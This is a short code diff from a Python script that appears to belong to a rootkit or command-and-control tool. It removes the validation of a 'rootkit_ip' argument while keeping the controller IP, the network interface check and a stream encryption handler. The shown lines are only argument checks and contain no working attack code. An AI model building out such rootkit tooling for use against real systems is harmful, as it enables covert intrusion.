@@ -37,10 +37,6 @@ if not validate_ipv4_address(ARGS.controller_ip):
     print(f"Invalid IPv4 Address: '{ARGS.controller_ip}'")
     sys.exit(1)
 
-if not validate_ipv4_address(ARGS.rootkit_ip):
-    print(f"Invalid IPv4 Address: '{ARGS.rootkit_ip}'")
-    sys.exit(1)
-
 if not validate_nic_interface(ARGS.interface):
     print(f"Network Interface does not exist: '{ARGS.interface}'")
     sys.exit(1)
@@ -48,7 +44,6 @@ if not validate_nic_interface(ARGS.interface):
 
 # Global Variables
 CONTROLLER_IP = ARGS.controller_ip
-# ROOTKIT_IP = ARGS.rootkit_ip
 NETWORK_INTERFACE = ARGS.interface
 ENCRYPTION_HANDLER = StreamEncryption()
 
